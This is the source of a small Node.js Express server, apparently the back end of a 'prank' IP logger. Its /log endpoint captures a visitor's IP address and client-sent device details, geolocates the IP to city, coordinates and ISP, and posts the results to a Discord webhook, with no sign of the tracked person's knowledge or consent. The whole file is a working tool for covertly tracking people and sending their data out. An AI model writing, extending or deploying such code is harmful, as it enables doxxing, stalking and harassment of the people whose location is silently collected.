const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

// Use environment variable from Render (set this in Render dashboard!)
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

if (!DISCORD_WEBHOOK) {
  console.error('DISCORD_WEBHOOK environment variable is missing!');
}

const lastData = {};

app.post('/log', async (req, res) => {
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();

  const userID = req.body.userID || 'unknown';
  const deviceInfo = req.body.deviceInfo || {};

  try {
    const geoResp = await axios.get(`https://ipapi.co/${ip}/json/`);
    const geo = geoResp.data;
    if (geo.error) throw new Error(geo.reason || 'Geo fail');

    const fullInfo = {
      ip,
      city: geo.city || '???',
      region: geo.region || '???',
      country: geo.country_name || '???',
      lat: geo.latitude?.toFixed(3) || '???',
      lon: geo.longitude?.toFixed(3) || '???',
      timezone: geo.timezone || '???',
      isp: geo.org || '???',
      ...deviceInfo
    };

    const last = lastData[userID];
    if (!last || JSON.stringify(last) !== JSON.stringify(fullInfo)) {
      if (DISCORD_WEBHOOK) {
        await axios.post(DISCORD_WEBHOOK, {
          content: `PRANK UPDATE (${new Date().toLocaleString()})\nUser: ${userID}\n` +
            Object.entries(fullInfo).map(([k, v]) => `${k}: ${v}`).join('\n')
        });
      } else {
        console.log('No webhook configured - skipping Discord send');
      }
    }

    lastData[userID] = fullInfo;
    res.json(fullInfo);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed' });
  }
});

app.get('/', (req, res) => res.send('Prank server running!'));

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Running on port ${port}`));
